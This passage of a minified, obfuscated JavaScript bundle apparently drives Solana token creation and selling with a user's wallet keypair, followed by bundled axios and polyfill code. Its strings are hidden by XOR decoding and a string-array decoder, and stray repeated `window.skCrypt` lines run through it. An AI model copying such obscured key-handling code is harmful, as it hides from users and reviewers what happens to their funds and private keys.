            const r = await e[R(h) + R(p)](t);
            if (r && O.JkCta(r.data.length, 150)) {
              const e = {};
              (e[R(m)] = t), (e.user = o.publicKey);
              const r = await n.extendAccountInstruction(e);
              x.add(r);
            }
          }
          const i = hl(r.publicKey, o[R(l)], !![]),
            s = O[R(g)](bl, o.publicKey, i, o.publicKey, r.publicKey);
          x.add(s);
          const a = ug(E, null, vy["solAmountU" + R(y)]),
            u = {};
          (u[R(w)] = E),
            (u.mint = r.publicKey),
            (u.creator = o[R(159)]),
            (u[R(b)] = o[R(159)]),
            (u[R(v) + "User"] = i),
            (u.amount = a),
            (u.solAmount = vy.solAmountUnits),
            (u.slippage = vy[R(A)]);
          const c = await n[R(182) + R(k)](u);
          x.add(c);
        }
        const { hash: D, lastValidHeight: U } = await FR(e),
          q = [o, r];
        (x.lastValidBlockHeight = U),
          (x["recentBloc" + R(I)] = D),
          x.sign(...q);
        const W = x.serialize(),
          z = {};
        (z[R(S) + "ght"] = !![]),
          (z.maxRetries = 0),
          (z["preflightC" + R(_)] = O.QSaJj);
        const K = await e.sendRawTransaction(W, z),
          F = (await e.getSignatureStatuses([K])).value[0],
          j =
            F &&
            null === F.err &&
            0 !== K[R(T)] &&
            void 0 !== K &&
            K !== O.PpDUc &&
            null !== K,
          G = {};
        return (
          (G[R(216)] = j
            ? "Coin created success" + R(C)
            : R(B) + " balance/too low SOL" + R(200)),
          (G.success = j),
          G
        );
      } catch (M) {
        let t = "Coin creat" + R(E);
        O.fEyBM(M, Error)
          ? (t = M[R(x)])
          : O[R(230)](typeof M, O.PSVNc)
          ? (t = M)
          : M && "object" == typeof M && (t = JSON[R(P)](M));
        const e = {};
        return (e[R(216)] = t), (e.success = ![]), e;
      }
    },
    Iy = async (t) => {
      var e;
      const n = 184,
        r = 225,
        o = 189,
        i = 181,
        s = 159,
        a = 217,
        u = by,
        c = {
          upTJV: function (t, e) {
            return t & e;
          },
          viGsV: function (t, e) {
            return t >>> e;
          },
        },
        l = c,
        d = Xg.getInstance();
      if (!d.isUserAuthenticated())
        return {
          msg: (function () {
            const t = 217,
              e = 188,
              n = {
                uJXnQ: function (t, e) {
                  return l[by(132)](t, e);
                },
                hcAwp: function (t, e) {
                  return l[by(135)](t, e);
                },
                RdHae: function (t, e) {
                  return t * e;
                },
                kzVgK: function (t, e) {
                  return t % e;
                },
              };
            let r;
            return function () {
              const o = by;
              if (!r) {
                const i = new Uint8Array([
                    196, 202, 35, 94, 177, 208, 53, 12, 255, 214, 50, 12, 240,
                    204, 50, 68, 244, 215, 50, 69, 242, 216, 50, 73, 245,
                  ]),
                  s = 742832529,
                  a = new Uint8Array(i[o(t)]);
                for (let t = 0; t < i.length; t++) {
                  const r = n.uJXnQ(n.hcAwp(s, n[o(e)](n.kzVgK(t, 4), 8)), 255);
                  a[t] = i[t] ^ r;
                }
                r = new TextDecoder().decode(a);
              }
              return r;
            };
          })()(),
          success: ![],
        };
      Zg[u(n) + "e"]().getSettings();
      const f = Jg.getInstance(),
        h = f.getWallet();
      if (!h)
        return {
          msg: (function () {
            let t;
            return function () {
              const e = by;
              if (!t) {
                const n = new Uint8Array([
                    202, 214, 51, 12, 253, 220, 35, 72, 179, 205, 41, 12, 240,
                    214, 40, 66, 246, 218, 50, 12, 234, 214, 51, 94, 179, 206,
                    39, 64, 255, 220, 50,
                  ]),
                  r = 742832531,
                  o = new Uint8Array(n[e(a)]);
                for (let t = 0; t < n.length; t++) {
                  const e = (r >>> ((t % 4) * 8)) & 255;
                  o[t] = n[t] ^ e;
                }
                t = new TextDecoder().decode(o);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      let p = f.getKeyPair();
      if (!f[u(r)]() || !p)
        return {
          msg: (function () {
            let t;
            return function () {
              if (!t) {
                const e = new Uint8Array([
                    210, 214, 51, 64, 245, 153, 40, 67, 229, 153, 32, 69, 255,
                    221, 102, 88, 254, 210, 35, 66, 191, 151, 121,
                  ]),
                  n = 742832529,
                  r = new Uint8Array(e.length);
                for (let t = 0; t < e.length; t++) {
                  const o = (n >>> ((t % 4) * 8)) & 255;
                  r[t] = e[t] ^ o;
                }
                t = new TextDecoder().decode(r);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      const m = d[u(207)](),
        g = d["getConnect" + u(o)](),
        { msg: y, success: w } = await (async (t, e, n, r, o) => {
          const i = 226,
            s = 233,
            a = 162,
            u = 159,
            c = 222,
            l = 142,
            d = 138,
            f = 169,
            h = 197,
            p = 199,
            m = 134,
            g = 201,
            y = 159,
            w = 164,
            b = 210,
            v = 191,
            A = 224,
            k = 172,
            I = 150,
            S = 216,
            _ = 213,
            T = 186,
            C = 180,
            B = by,
            E = {
              jWmOh: function (t, e, n, r) {
                return t(e, n, r);
              },
              ORaow: function (t, e) {
                return t(e);
              },
              EvNVC: function (t, e) {
                return t !== e;
              },
              pCGma: "Slippage t" + B(149) + " enough ba" + B(i),
              xypHv: B(s),
              pQWVZ: function (t, e) {
                return t === e;
              },
              GveiK: B(a),
            };
          try {
            const i = hl(r[B(u)], n.publicKey),
              s = await t.getTokenAccountBalance(i),
              a = new Xn.BN(s[B(c)].amount)[B(l)](o).divn(100);
            if (a.isZero()) {
              const t = {};
              return (
                (t.msg = "You don't " + B(d) + " this token"),
                (t.success = ![]),
                t
              );
            }
            const T = await e.fetchGlobal(),
              C = e.bondingCurvePda(r.publicKey),
              [x, P] = await Promise.all([
                t[B(f) + "Info"](C),
                e["fetchBondi" + B(h)](r.publicKey),
              ]),
              R = E[B(157)](cg, T, P, a),
              O = new bs(),
              M = { units: 45e4 };
            O.add(Yu[B(p) + "UnitLimit"](M));
            const L = {};
            (L.microLamports = vy["priorityFe" + B(m)]),
              O.add(Yu.setComputeUnitPrice(L));
            const N = {};
            (N.global = T),
              (N.bondingCurveAccountInfo = x),
              (N.bondingCurve = P),
              (N.mint = r.publicKey),
              (N[B(g)] = n[B(y)]),
              (N[B(w)] = a),
              (N.solAmount = R),
              (N.slippage = vy.slippage);
            const D = await e[B(b) + B(v)](N);
            O[B(141)](...D);
            const { hash: U, lastValidHeight: q } = await E.ORaow(FR, t),
              W = [n];
            (O.lastValidBlockHeight = q), (O.recentBlockhash = U), O.sign(...W);
            const z = O[B(A)](),
              K = { skipPreflight: !![], maxRetries: 0 };
            K.preflightCommitment = B(k);
            const F = await t.sendRawTransaction(z, K),
              j =
                E.EvNVC(F[B(217)], 0) &&
                void 0 !== F &&
                F !== B(I) &&
                E.EvNVC(F, null),
              G = {};
            return (
              (G[B(S)] = j ? E[B(147)] : B(_) + "ly sold " + o + "% of tokens"),
              (G.success = j),
              G
            );
          } catch (x) {
            let t = "Selling fa" + B(T);
            x instanceof Error
              ? (t = x.message)
              : typeof x === E[B(143)]
              ? (t = x)
              : x && E.pQWVZ(typeof x, E.GveiK) && (t = JSON.stringify(x));
            const e = {};
            return (e.msg = t), (e[B(C)] = ![]), e;
          }
        })(g, m, h, p, t);
      await (null == (e = Og[u(i) + "nt"]()) ? void 0 : e.getBalance(h[u(s)]));
      const b = {};
      return (b.msg = y), (b[u(180)] = w), b;
    };
  function Sy() {
    const t = [
      "B28GBg93l25VDa",
      "Dw5KzwzPBMvK",
      "wxvxwKW",
      "yxnZB2nPyxrLza",
      "ofDKA2rZrG",
      "ChvTCa",
      "nfLgy3LouW",
      "mtmYodqYnK1dzK5IwG",
      "ALDTt2G",
      "zNvSBhK",
      "ChvIBgLJs2v5",
      "A0rYt0K",
      "C3LTyM9S",
      "B2jQzwn0",
      "BML0CW",
      "yw1VDw50",
      "lIbzB3uGBMvLza",
      "mJiZnZqZmuDXwwPKqG",
      "mtKXnteXvLzTwKHx",
      "sw5MBW",
      "z2v0qwnJB3vUDa",
      "BK5VyKG",
      "AxnAzxjV",
      "y29UzMLYBwvK",
      "C3rYAw5NAwz5",
      "C2TPCfbYzwzSAq",
      "nda0mJm1mhblCKz5rq",
      "mtu5mZKWnwjcvgrLCq",
      "ywnJB3vUDa",
      "y3rVCIGICMv0Dq",
      "E30Uy29UC3rYDq",
      "C3vJy2vZCW",
      "z2v0uNbJq2XPzq",
      "yNv5sw5ZDhj1yW",
      "C29Sqw1VDw50vq",
      "z2v0sw5ZDgfUyW",
      "DwLKAxr5",
      "AwXLza",
      "icSGmc4WmYbttW",
      "uMriywu",
      "Aw9U",
      "t1nWtg0",
      "y3rPB25Z",
      "sw5ZDwzMAwnPzq",
      "vw5PDeXPBwL0",
      "Aw5PDgLHBeXPCq",
      "odmXmtuWDw1IqMDq",
      "uLDrvfa",
      "BMDdDxj2zq",
      "Dw5PDhm",
      "C2v0q29TChv0zq",
      "igfTB3vUDa",
      "DxnLCG",
      "BMfTzq",
      "yM9UzgLUz0n1CG",
      "zgvJB2rL",
      "zgzhv0e",
      "odrsrhfsqKe",
      "z2v0u0rl",
      "zw50AwnHDgvK",
      "Aw9UigzHAwXLza",
      "C2vSBeLUC3rYDq",
      "kcGOlISPkYKRkq",
      "y3jLyxrLsw5ZDa",
      "u3vJy2vZC2z1Ba",
      "Bg9N",
      "ChjPB3jPDhLgzq",
      "BxnN",
      "BgvUz3rO",
      "nte2ntG3AMDyBw9c",
      "DgTYDeq",
      "Dg9tDhjPBMC",
      "vKvbzLe",
      "DMfSDwu",
      "z2v0q29UBMvJDa",
      "C2vYAwfSAxPL",
      "AgfZs2v5ugfPCG",
      "BgfUy2u",
      "C2XPChbHz2u",
      "z2v0qMfSyw5Jzq",
      "mLb5vKnrwa",
      "wvvorhO",
      "z2XVyMfS",
      "Axv2uuG",
      "C3rYAw5N",
      "Aw5MBW",
      "y29UC29Szq",
      "yxbWBhK",
      "CNrZ",
      "nMXRB1fxrW",
      "yMLUza",
      "DxbusLy",
      "BwLUDa",
      "zvvUAxrZ",
      "DMLhC1y",
      "DgLVBG",
      "A2HHC2G",
      "B3DUigfUEsbVzG",
      "ChjVDg90ExbL",
      "zxjYB3i",
      "ywrK",
      "BxvSBG",
      "EhLWshy",
      "tM90igvUB3vNAa",
      "BwvZC2fNzq",
      "B21TAxrTzw50",
      "CenhBwe",
      "rvbAA00",
    ];
    return (Sy = function () {
      return t;
    })();
  }
  axiom,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var _y,
    Ty,
    Cy = { exports: {} },
    By = (Cy.exports = {});
  function Ey() {
    throw new Error("setTimeout has not been defined");
  }
  function xy() {
    throw new Error("clearTimeout has not been defined");
  }
  function Py(t) {
    if (_y === setTimeout) return setTimeout(t, 0);
    if ((_y === Ey || !_y) && setTimeout)
      return (_y = setTimeout), setTimeout(t, 0);
    try {
      return _y(t, 0);
    } catch (e) {
      try {
        return _y.call(null, t, 0);
      } catch (n) {
        return _y.call(this, t, 0);
      }
    }
  }
  !(function () {
    try {
      _y = "function" == typeof setTimeout ? setTimeout : Ey;
    } catch (t) {
      _y = Ey;
    }
    try {
      Ty = "function" == typeof clearTimeout ? clearTimeout : xy;
    } catch (t) {
      Ty = xy;
    }
  })();
  var Ry,
    Oy = [],
    My = !1,
    Ly = -1;
  function Ny() {
    My &&
      Ry &&
      ((My = !1),
      Ry.length ? (Oy = Ry.concat(Oy)) : (Ly = -1),
      Oy.length && Dy());
  }
  function Dy() {
    if (!My) {
      var t = Py(Ny);
      My = !0;
      for (var e = Oy.length; e; ) {
        for (Ry = Oy, Oy = []; ++Ly < e; ) Ry && Ry[Ly].run();
        (Ly = -1), (e = Oy.length);
      }
      (Ry = null),
        (My = !1),
        (function (t) {
          if (Ty === clearTimeout) return clearTimeout(t);
          if ((Ty === xy || !Ty) && clearTimeout)
            return (Ty = clearTimeout), clearTimeout(t);
          try {
            return Ty(t);
          } catch (e) {
            try {
              return Ty.call(null, t);
            } catch (n) {
              return Ty.call(this, t);
            }
          }
        })(t);
    }
  }
  function Uy(t, e) {
    (this.fun = t), (this.array = e);
  }
  function qy() {}
  (By.nextTick = function (t) {
    var e = new Array(arguments.length - 1);
    if (arguments.length > 1)
      for (var n = 1; n < arguments.length; n++) e[n - 1] = arguments[n];
    Oy.push(new Uy(t, e)), 1 !== Oy.length || My || Py(Dy);
  }),
    (Uy.prototype.run = function () {
      this.fun.apply(null, this.array);
    }),
    (By.title = "browser"),
    (By.browser = !0),
    (By.env = {}),
    (By.argv = []),
    (By.version = ""),
    (By.versions = {}),
    (By.on = qy),
    (By.addListener = qy),
    (By.once = qy),
    (By.off = qy),
    (By.removeListener = qy),
    (By.removeAllListeners = qy),
    (By.emit = qy),
    (By.prependListener = qy),
    (By.prependOnceListener = qy),
    (By.listeners = function (t) {
      return [];
    }),
    (By.binding = function (t) {
      throw new Error("process.binding is not supported");
    }),
    (By.cwd = function () {
      return "/";
    }),
    (By.chdir = function (t) {
      throw new Error("process.chdir is not supported");
    }),
    (By.umask = function () {
      return 0;
    });
  const Wy = (function (t) {
    return t &&
      t.__esModule &&
      Object.prototype.hasOwnProperty.call(t, "default")
      ? t.default
      : t;
  })(Cy.exports);
  function zy(t, e) {
    return function () {
      return t.apply(e, arguments);
    };
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const { toString: Ky } = Object.prototype,
    { getPrototypeOf: Fy } = Object,
    { iterator: jy, toStringTag: Gy } = Symbol,
    Vy = ((t) => (e) => {
      const n = Ky.call(e);
      return t[n] || (t[n] = n.slice(8, -1).toLowerCase());
    })(Object.create(null)),
    Hy = (t) => ((t = t.toLowerCase()), (e) => Vy(e) === t),
    Xy = (t) => (e) => typeof e === t,
    { isArray: Zy } = Array,
    Jy = Xy("undefined");
  const Yy = Hy("ArrayBuffer");
  const Qy = Xy("string"),
    $y = Xy("function"),
    tw = Xy("number"),
    ew = (t) => null !== t && "object" == typeof t,
    nw = (t) => {
      if ("object" !== Vy(t)) return !1;
      const e = Fy(t);
      return !(
        (null !== e &&
          e !== Object.prototype &&
          null !== Object.getPrototypeOf(e)) ||
        Gy in t ||
        jy in t
      );
    },
    rw = Hy("Date"),
    ow = Hy("File"),
    iw = Hy("Blob"),
    sw = Hy("FileList"),
    aw = Hy("URLSearchParams"),
    [uw, cw, lw, dw] = ["ReadableStream", "Request", "Response", "Headers"].map(
      Hy
    );
  function fw(t, e, { allOwnKeys: n = !1 } = {}) {
    if (null == t) return;
    let r, o;
    if (("object" != typeof t && (t = [t]), Zy(t)))
      for (r = 0, o = t.length; r < o; r++) e.call(null, t[r], r, t);
    else {
      const o = n ? Object.getOwnPropertyNames(t) : Object.keys(t),
        i = o.length;
      let s;
      for (r = 0; r < i; r++) (s = o[r]), e.call(null, t[s], s, t);
    }
  }
  function hw(t, e) {
    e = e.toLowerCase();
    const n = Object.keys(t);
    let r,
      o = n.length;
    for (; o-- > 0; ) if (((r = n[o]), e === r.toLowerCase())) return r;
    return null;
  }
  const pw =
      "undefined" != typeof globalThis
        ? globalThis
        : "undefined" != typeof self
        ? self
        : "undefined" != typeof window
        ? window
        : Sl,
    mw = (t) => !Jy(t) && t !== pw;
  const gw = (
      (t) => (e) =>
        t && e instanceof t
    )("undefined" != typeof Uint8Array && Fy(Uint8Array)),
    yw = Hy("HTMLFormElement"),
    ww = (
      ({ hasOwnProperty: t }) =>
      (e, n) =>
        t.call(e, n)
    )(Object.prototype),
    bw = Hy("RegExp"),
    vw = (t, e) => {
      const n = Object.getOwnPropertyDescriptors(t),
        r = {};
      fw(n, (n, o) => {
        let i;
        !1 !== (i = e(n, o, t)) && (r[o] = i || n);
      }),
        Object.defineProperties(t, r);
    };
  const Aw = Hy("AsyncFunction"),
    kw =
      ((Iw = "function" == typeof setImmediate),
      (Sw = $y(pw.postMessage)),
      Iw
        ? setImmediate
        : Sw
        ? ((_w = `axios@${Math.random()}`),
          (Tw = []),
          pw.addEventListener(
            "message",
            ({ source: t, data: e }) => {
              t === pw && e === _w && Tw.length && Tw.shift()();
            },
            !1
          ),
          (t) => {
            Tw.push(t), pw.postMessage(_w, "*");
          })
        : (t) => setTimeout(t));
  var Iw, Sw, _w, Tw;
  const Cw =
      "undefined" != typeof queueMicrotask
        ? queueMicrotask.bind(pw)
        : (void 0 !== Wy && Wy.nextTick) || kw,
    Bw = {
      isArray: Zy,
      isArrayBuffer: Yy,
      isBuffer: function (t) {
        return (
          null !== t &&
          !Jy(t) &&
          null !== t.constructor &&
          !Jy(t.constructor) &&
          $y(t.constructor.isBuffer) &&
          t.constructor.isBuffer(t)
        );
      },
      isFormData: (t) => {
        let e;
        return (
          t &&
          (("function" == typeof FormData && t instanceof FormData) ||
            ($y(t.append) &&
              ("formdata" === (e = Vy(t)) ||
                ("object" === e &&
                  $y(t.toString) &&
                  "[object FormData]" === t.toString()))))
        );
      },
      isArrayBufferView: function (t) {
        let e;
        return (
          (e =
            "undefined" != typeof ArrayBuffer && ArrayBuffer.isView
              ? ArrayBuffer.isView(t)
              : t && t.buffer && Yy(t.buffer)),
          e
        );
      },
      isString: Qy,
      isNumber: tw,
      isBoolean: (t) => !0 === t || !1 === t,
      isObject: ew,
      isPlainObject: nw,
      isReadableStream: uw,
      isRequest: cw,
      isResponse: lw,
      isHeaders: dw,
      isUndefined: Jy,
      isDate: rw,
      isFile: ow,
      isBlob: iw,
      isRegExp: bw,
      isFunction: $y,
      isStream: (t) => ew(t) && $y(t.pipe),
      isURLSearchParams: aw,
      isTypedArray: gw,
      isFileList: sw,
      forEach: fw,
      merge: function t() {
        const { caseless: e } = (mw(this) && this) || {},
          n = {},
          r = (r, o) => {
            const i = (e && hw(n, o)) || o;
            nw(n[i]) && nw(r)
              ? (n[i] = t(n[i], r))
              : nw(r)
              ? (n[i] = t({}, r))
              : Zy(r)
              ? (n[i] = r.slice())
              : (n[i] = r);
          };
        for (let o = 0, i = arguments.length; o < i; o++)
          arguments[o] && fw(arguments[o], r);
        return n;
      },
      extend: (t, e, n, { allOwnKeys: r } = {}) => (
        fw(
          e,
          (e, r) => {
            n && $y(e) ? (t[r] = zy(e, n)) : (t[r] = e);
          },
          { allOwnKeys: r }
        ),
        t
      ),
      trim: (t) =>
        t.trim ? t.trim() : t.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, ""),
      stripBOM: (t) => (65279 === t.charCodeAt(0) && (t = t.slice(1)), t),
      inherits: (t, e, n, r) => {
        (t.prototype = Object.create(e.prototype, r)),
          (t.prototype.constructor = t),
          Object.defineProperty(t, "super", { value: e.prototype }),
          n && Object.assign(t.prototype, n);
      },
      toFlatObject: (t, e, n, r) => {
        let o, i, s;
        const a = {};
        if (((e = e || {}), null == t)) return e;
        do {
          for (o = Object.getOwnPropertyNames(t), i = o.length; i-- > 0; )
            (s = o[i]),
              (r && !r(s, t, e)) || a[s] || ((e[s] = t[s]), (a[s] = !0));
          t = !1 !== n && Fy(t);
        } while (t && (!n || n(t, e)) && t !== Object.prototype);
        return e;
      },
      kindOf: Vy,
      kindOfTest: Hy,
      endsWith: (t, e, n) => {
        (t = String(t)),
          (void 0 === n || n > t.length) && (n = t.length),
          (n -= e.length);
        const r = t.indexOf(e, n);
        return -1 !== r && r === n;
      },
      toArray: (t) => {
        if (!t) return null;
        if (Zy(t)) return t;
        let e = t.length;
        if (!tw(e)) return null;
        const n = new Array(e);
        for (; e-- > 0; ) n[e] = t[e];
        return n;
      },
      forEachEntry: (t, e) => {
        const n = (t && t[jy]).call(t);
        let r;
        for (; (r = n.next()) && !r.done; ) {
          const n = r.value;
          e.call(t, n[0], n[1]);
        }
      },
      matchAll: (t, e) => {
        let n;
        const r = [];
        for (; null !== (n = t.exec(e)); ) r.push(n);
        return r;
      },
      isHTMLForm: yw,
      hasOwnProperty: ww,
      hasOwnProp: ww,
      reduceDescriptors: vw,
      freezeMethods: (t) => {
        vw(t, (e, n) => {
          if ($y(t) && -1 !== ["arguments", "caller", "callee"].indexOf(n))
            return !1;
          const r = t[n];
          if ($y(r)) {
            if (((e.enumerable = !1), "writable" in e))
              return (e.writable = !1), void 0;
            e.set ||
              (e.set = () => {
                throw Error("Can not rewrite read-only method '" + n + "'");
              });
          }
        });
      },
      toObjectSet: (t, e) => {
        const n = {},
          r = (t) => {
            t.forEach((t) => {
              n[t] = !0;
            });
          };
        return Zy(t) ? r(t) : r(String(t).split(e)), n;
      },
      toCamelCase: (t) =>
        t.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function (t, e, n) {
          return e.toUpperCase() + n;
        }),
      noop: () => {},
      toFiniteNumber: (t, e) =>
        null != t && Number.isFinite((t = +t)) ? t : e,
      findKey: hw,
      global: pw,
      isContextDefined: mw,
      isSpecCompliantForm: function (t) {
        return !!(t && $y(t.append) && "FormData" === t[Gy] && t[jy]);
      },
      toJSONObject: (t) => {
        const e = new Array(10),
          n = (t, r) => {
            if (ew(t)) {
              if (e.indexOf(t) >= 0) return;
              if (!("toJSON" in t)) {
                e[r] = t;
                const o = Zy(t) ? [] : {};
                return (
                  fw(t, (t, e) => {
                    const i = n(t, r + 1);
                    !Jy(i) && (o[e] = i);
                  }),
                  (e[r] = void 0),
                  o
                );
              }
            }
            return t;
          };
        return n(t, 0);
      },
      isAsyncFn: Aw,
      isThenable: (t) => t && (ew(t) || $y(t)) && $y(t.then) && $y(t.catch),
      setImmediate: kw,
      asap: Cw,
      isIterable: (t) => null != t && $y(t[jy]),
    };
  function Ew(t, e, n, r, o) {
    Error.call(this),
      Error.captureStackTrace
        ? Error.captureStackTrace(this, this.constructor)
        : (this.stack = new Error().stack),
      (this.message = t),
      (this.name = "AxiosError"),
      e && (this.code = e),
      n && (this.config = n),
      r && (this.request = r),
      o && ((this.response = o), (this.status = o.status ? o.status : null));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    Bw.inherits(Ew, Error, {
      toJSON: function () {
        return {
          message: this.message,
          name: this.name,
          description: this.description,
          number: this.number,
          fileName: this.fileName,
          lineNumber: this.lineNumber,
          columnNumber: this.columnNumber,
          stack: this.stack,
          config: Bw.toJSONObject(this.config),
          code: this.code,
          status: this.status,
        };
      },
    });
  const xw = Ew.prototype,
    Pw = {};
  [
    "ERR_BAD_OPTION_VALUE",
    "ERR_BAD_OPTION",
    "ECONNABORTED",
    "ETIMEDOUT",
    "ERR_NETWORK",
    "ERR_FR_TOO_MANY_REDIRECTS",
    "ERR_DEPRECATED",
    "ERR_BAD_RESPONSE",
    "ERR_BAD_REQUEST",
    "ERR_CANCELED",
    "ERR_NOT_SUPPORT",
    "ERR_INVALID_URL",
  ].forEach((t) => {
    Pw[t] = { value: t };
  }),
    Object.defineProperties(Ew, Pw),
    Object.defineProperty(xw, "isAxiosError", { value: !0 }),
    (Ew.from = (t, e, n, r, o, i) => {
      const s = Object.create(xw);
      return (
        Bw.toFlatObject(
          t,
          s,
          function (t) {
            return t !== Error.prototype;
          },
          (t) => "isAxiosError" !== t
        ),
        Ew.call(s, t.message, e, n, r, o),
        (s.cause = t),
        (s.name = t.name),
        i && Object.assign(s, i),
        s
      );
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function Rw(t) {
    return Bw.isPlainObject(t) || Bw.isArray(t);
  }
  function Ow(t) {
    return Bw.endsWith(t, "[]") ? t.slice(0, -2) : t;
  }
  function Mw(t, e, n) {
    return t
      ? t
          .concat(e)
          .map(function (t, e) {
            return (t = Ow(t)), !n && e ? "[" + t + "]" : t;
          })
          .join(n ? "." : "")
      : e;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Lw = Bw.toFlatObject(Bw, {}, null, function (t) {
    return /^is[A-Z]/.test(t);
  });
  function Nw(t, e, n) {
    if (!Bw.isObject(t)) throw new TypeError("target must be an object");
    e = e || new FormData();
    const r = (n = Bw.toFlatObject(
        n,
        { metaTokens: !0, dots: !1, indexes: !1 },
        !1,
        function (t, e) {
          return !Bw.isUndefined(e[t]);
        }
      )).metaTokens,
      o = n.visitor || c,
      i = n.dots,
      s = n.indexes,
      a =
        (n.Blob || ("undefined" != typeof Blob && Blob)) &&
        Bw.isSpecCompliantForm(e);
    if (!Bw.isFunction(o)) throw new TypeError("visitor must be a function");
    function u(t) {
      if (null === t) return "";
      if (Bw.isDate(t)) return t.toISOString();
      if (Bw.isBoolean(t)) return t.toString();
      if (!a && Bw.isBlob(t))
        throw new Ew("Blob is not supported. Use a Buffer instead.");
      return Bw.isArrayBuffer(t) || Bw.isTypedArray(t)
        ? a && "function" == typeof Blob
          ? new Blob([t])
          : ct.from(t)
        : t;
    }
    function c(t, n, o) {
      let a = t;
      if (t && !o && "object" == typeof t)
        if (Bw.endsWith(n, "{}"))
          (n = r ? n : n.slice(0, -2)), (t = JSON.stringify(t));
        else if (
          (Bw.isArray(t) &&
            (function (t) {
              return Bw.isArray(t) && !t.some(Rw);
            })(t)) ||
          ((Bw.isFileList(t) || Bw.endsWith(n, "[]")) && (a = Bw.toArray(t)))
        )
          return (
            (n = Ow(n)),
            a.forEach(function (t, r) {
              !Bw.isUndefined(t) &&
                null !== t &&
                e.append(
                  !0 === s ? Mw([n], r, i) : null === s ? n : n + "[]",
                  u(t)
                );
            }),
            !1
          );
      return !!Rw(t) || (e.append(Mw(o, n, i), u(t)), !1);
    }
    const l = [],
      d = Object.assign(Lw, {
        defaultVisitor: c,
        convertValue: u,
        isVisitable: Rw,
      });
    if (!Bw.isObject(t)) throw new TypeError("data must be an object");
    return (
      !(function t(n, r) {
        if (!Bw.isUndefined(n)) {
          if (-1 !== l.indexOf(n))
            throw Error("Circular reference detected in " + r.join("."));
          l.push(n),
            Bw.forEach(n, function (n, i) {
              !0 ===
                (!(Bw.isUndefined(n) || null === n) &&
                  o.call(e, n, Bw.isString(i) ? i.trim() : i, r, d)) &&
                t(n, r ? r.concat(i) : [i]);
            }),
            l.pop();
        }
      })(t),
      e
    );
  }
  function Dw(t) {
    const e = {
      "!": "%21",
      "'": "%27",
      "(": "%28",
      ")": "%29",
      "~": "%7E",
      "%20": "+",
      "%00": "\0",
    };
    return encodeURIComponent(t).replace(/[!'()~]|%20|%00/g, function (t) {
      return e[t];
    });
  }
  function Uw(t, e) {
    (this._pairs = []), t && Nw(t, this, e);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const qw = Uw.prototype;
  function Ww(t) {
    return encodeURIComponent(t)
      .replace(/%3A/gi, ":")
      .replace(/%24/g, "$")
      .replace(/%2C/gi, ",")
      .replace(/%20/g, "+")
      .replace(/%5B/gi, "[")
      .replace(/%5D/gi, "]");
  }
  function zw(t, e, n) {
    if (!e) return t;
    const r = (n && n.encode) || Ww;
    Bw.isFunction(n) && (n = { serialize: n });
    const o = n && n.serialize;
    let i;
    if (
      ((i = o
        ? o(e, n)
        : Bw.isURLSearchParams(e)
        ? e.toString()
        : new Uw(e, n).toString(r)),
      i)
    ) {
      const e = t.indexOf("#");
      -1 !== e && (t = t.slice(0, e)),
        (t += (-1 === t.indexOf("?") ? "?" : "&") + i);
    }
    return t;
  }
  (qw.append = function (t, e) {
    this._pairs.push([t, e]);
  }),
    (qw.toString = function (t) {
      const e = t
        ? function (e) {
            return t.call(this, e, Dw);
          }
        : Dw;
      return this._pairs
        .map(function (t) {
          return e(t[0]) + "=" + e(t[1]);
        }, "")
        .join("&");
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class Kw {
    constructor() {
      this.handlers = [];
    }
    use(t, e, n) {
      return (
        this.handlers.push({
          fulfilled: t,
          rejected: e,
          synchronous: !!n && n.synchronous,
          runWhen: n ? n.runWhen : null,
        }),
        this.handlers.length - 1
      );
    }
    eject(t) {
      this.handlers[t] && (this.handlers[t] = null);
    }
    clear() {
      this.handlers && (this.handlers = []);
    }
    forEach(t) {
      Bw.forEach(this.handlers, function (e) {
        null !== e && t(e);
      });
    }
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Fw = {
    silentJSONParsing: !0,
    forcedJSONParsing: !0,
    clarifyTimeoutError: !1,
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const jw = "undefined" != typeof URLSearchParams ? URLSearchParams : Uw;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Gw = "undefined" != typeof FormData ? FormData : null;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Vw = "undefined" != typeof Blob ? Blob : null;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Hw = {
    isBrowser: !0,
    classes: { URLSearchParams: jw, FormData: Gw, Blob: Vw },
    protocols: ["http", "https", "file", "blob", "url", "data"],
  };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Xw = "undefined" != typeof window && "undefined" != typeof document,
    Zw = ("object" == typeof navigator && navigator) || void 0,
    Jw =
      Xw &&
      (!Zw || ["ReactNative", "NativeScript", "NS"].indexOf(Zw.product) < 0),
    Yw =
      "undefined" != typeof WorkerGlobalScope &&
      self instanceof WorkerGlobalScope &&
      "function" == typeof self.importScripts,
    Qw = (Xw && window.location.href) || "http://localhost",
    $w = Object.freeze(
      Object.defineProperty(
        {
          __proto__: null,
          hasBrowserEnv: Xw,
          hasStandardBrowserEnv: Jw,
          hasStandardBrowserWebWorkerEnv: Yw,
          navigator: Zw,
          origin: Qw,
        },
        Symbol.toStringTag,
        { value: "Module" }
      )
    );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const tb = { ...$w, ...Hw };
  function eb(t) {
    function e(t, n, r, o) {
      let i = t[o++];
      if ("__proto__" === i) return !0;
      const s = Number.isFinite(+i),
        a = o >= t.length;
      if (((i = !i && Bw.isArray(r) ? r.length : i), a))
        return Bw.hasOwnProp(r, i) ? (r[i] = [r[i], n]) : (r[i] = n), !s;
